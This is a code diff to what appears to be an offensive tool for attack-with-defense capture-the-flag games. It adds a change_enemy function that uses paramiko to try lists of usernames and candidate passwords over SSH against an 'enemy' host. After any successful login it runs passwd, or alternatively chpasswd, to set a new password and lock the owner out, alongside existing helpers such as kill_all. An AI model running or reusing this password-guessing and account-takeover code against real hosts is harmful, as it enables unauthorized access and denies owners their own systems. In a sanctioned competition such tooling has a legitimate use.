@@ -3,6 +3,7 @@
 
 import sys
 import argparse
+import paramiko
 from asyncio import subprocess
 from io import UnsupportedOperation
 from pymongo import MongoClient as MC
@@ -25,10 +26,12 @@ db = mc[database_info.get('name') or 'AWD']
 def TurnOn():
     parser = argparse.ArgumentParser()
     parser.add_argument('-e', '--enemise', dest='enemise', nargs='+', help='enemy 2 destroy')
-    parser.add_argument('-o', '--oldpwd', dest='old_pwd', help='the old password')
+    parser.add_argument('-o', '--oldpwd', dest='old_pwd', nargs='+', help='the old password')
     parser.add_argument('-n', '--newpwd', dest='new_pwd', help='the new password')
     parser.add_argument('-O', '--out', dest='output',  help='output results file')
     parser.add_argument('-c', '--change', dest='change', action='store_true', help='whether change pwd')
+    parser.add_argument('-u', '--usernames', dest='usernames', nargs='+', help='user list')
+    #parser.add_argument('-')
 
     commands = parser.parse_args()
     return commands
@@ -93,6 +96,28 @@ def resharp_results(sshed, pinged):
         results[x] = ['ssh', 'ping'] if results.get(x) else ['ping']
 
     return results
+
+
+def change_enemy(enemy, names, old_pwd, new_pwd):
+    assert(isinstance(names, list) and isinstance(old_pwd, list))
+    status = 0
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    for name in names:
+        for old in old_pwd:
+            try:
+                ssh_client.connect(enemy, username=name, password=old)
+                payload = f'{old}\n{new_pwd}\n{new_pwd}\n'
+                std_in, std_out, std_err = ssh_client.exec_command('passwd')
+                std_in.write(payload)
+
+               # payload1 = f"echo '{name}:{new_pwd}' | chpasswd"
+               # std_in, std_out, std_err = ssh_client.exec_command(payload1)
+            except paramiko.AuthenticationException:
+                print(f'[-] error old pwd for user <{name}> at <{enemy}>')
+            else:
+                status = 1
+    return status
 
 
 def kill_all(lives):
